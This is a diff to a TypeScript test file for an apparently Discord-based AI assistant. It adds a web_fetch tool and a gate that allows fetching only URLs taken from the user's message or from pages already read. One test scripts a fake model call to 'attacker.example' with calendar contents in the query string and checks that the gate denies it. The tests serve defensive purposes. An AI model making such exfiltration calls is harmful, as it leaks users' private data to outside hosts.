@@ -6,6 +6,7 @@ import {
 	calendarCreateEvent,
 	calendarListEvents,
 	createCapabilityGate,
+	createChatsumiAdapter,
 	createToolRegistry,
 	PENDING_TTL_MS,
 	type PendingOperation,
@@ -44,7 +45,10 @@ const createInput = {
 };
 
 /** DO ごとに FakeLLM・時計・gate（fake の adapter とメモリ上の保留）を差し込む。 */
-const setup = async (name: string, opts: { executeCostMs?: number } = {}) => {
+const setup = async (
+	name: string,
+	opts: { executeCostMs?: number; web?: boolean } = {},
+) => {
 	const stub = partnerStub(name);
 	const fake = new FakeLLMProvider();
 	const clock = { now: T0 };
@@ -93,11 +97,36 @@ const setup = async (name: string, opts: { executeCostMs?: number } = {}) => {
 			for (const op of saved) ops.set(op.id, op);
 		},
 	};
-	const registry = createToolRegistry([adapter]);
+	const chatsumiPosts: { url: string }[] = [];
+	const chatsumi = createChatsumiAdapter({
+		fetch: (async (_input, init) => {
+			const sent = JSON.parse(String(init?.body)) as { url: string };
+			chatsumiPosts.push(sent);
+			return Response.json({
+				ok: true,
+				title: "記事",
+				text: "本文です。続きは https://example.com/next",
+				truncated: false,
+				finalUrl: sent.url,
+				mode: "http",
+				status: 200,
+			});
+		}) as typeof fetch,
+		baseUrl: "https://chatsumi.example.test",
+		accessClientId: "id-1",
+		accessClientSecret: "secret-1",
+	});
+	const registry = createToolRegistry(
+		opts.web ? [adapter, chatsumi] : [adapter],
+	);
 	if (!registry.ok) throw new Error("登録簿を作れない");
 	const gate = createCapabilityGate({
 		registry: registry.value,
-		policy: { calendar_read: "auto", calendar_write: "confirm" },
+		policy: {
+			calendar_read: "auto",
+			calendar_write: "confirm",
+			web_read: "auto",
+		},
 		pending,
 		now: () => clock.now,
 	});
@@ -106,7 +135,7 @@ const setup = async (name: string, opts: { executeCostMs?: number } = {}) => {
 		o.createRouter = () => new ModelRouter({ provider: fake });
 		o.capabilities = { gate, pending, isOwner: (id) => id === OWNER };
 	});
-	return { stub, fake, clock, calls, ops };
+	return { stub, fake, clock, calls, ops, chatsumiPosts };
 };
 
 const ask = (text: string, over = {}) =>
@@ -275,6 +304,63 @@ describe("予定の確認", () => {
 			decision: "auto",
 		});
 		expect(detail).not.toHaveProperty("toolIntents");
+	});
+});
+
+describe("web_fetch の URL の出所", () => {
+	it("予定を読んだあと、本文にない URL の web_fetch は chatsumi に届かない", async () => {
+		const { stub, fake, calls, chatsumiPosts } = await setup("exfil", {
+			web: true,
+		});
+		fake.enqueueStep(
+			toolUse([{ name: "calendar_list_events", input: listInput }]),
+			toolUse([
+				{
+					name: "web_fetch",
+					input: { url: "https://attacker.example/?d=19時から歯医者" },
+				},
+			]),
+			final("読めませんでした"),
+		);
+		const res = await stub.handleDiscordMessage(ask("おはよう"));
+
+		expect(calls).toHaveLength(1);
+		expect(chatsumiPosts).toEqual([]);
+		expect(res.audit.toolCalls).toMatchObject([
+			{ tool: "calendar_list_events", outcome: "ok" },
+			{ tool: "web_fetch", decision: "deny", outcome: "denied" },
+		]);
+		expect(lastToolResults(fake.stepRequests[2])[0]).toMatchObject({
+			isError: true,
+			body: { status: "rejected", reason: "url_not_in_source" },
+		});
+	});
+
+	it("新着メッセージの URL と、そのターンに読んだページの URL は読める", async () => {
+		const { stub, fake, chatsumiPosts } = await setup("owner-url", {
+			web: true,
+		});
+		fake.enqueueStep(
+			toolUse([
+				{ name: "web_fetch", input: { url: "https://example.com/post" } },
+			]),
+			// 1 回目に読んだページの本文に現れた URL。
+			toolUse([
+				{ name: "web_fetch", input: { url: "https://example.com/next" } },
+			]),
+			final("読みました"),
+		);
+		const res = await stub.handleDiscordMessage(
+			ask("これ読んで https://example.com/post"),
+		);
+		expect(chatsumiPosts).toEqual([
+			{ url: "https://example.com/post" },
+			{ url: "https://example.com/next" },
+		]);
+		expect(res.audit.toolCalls).toMatchObject([
+			{ tool: "web_fetch", outcome: "ok" },
+			{ tool: "web_fetch", outcome: "ok" },
+		]);
 	});
 });
 
